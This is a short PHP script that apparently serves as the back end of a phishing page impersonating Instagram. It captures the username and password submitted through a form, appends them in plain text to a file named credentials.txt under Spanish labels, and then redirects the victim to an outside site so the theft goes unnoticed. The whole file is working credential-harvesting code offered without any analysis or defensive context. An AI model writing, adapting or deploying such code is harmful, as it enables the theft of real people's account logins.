<?php

file_put_contents("credentials.txt", "[+] Instagram -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://ezlikers.com/');
exit();
?>
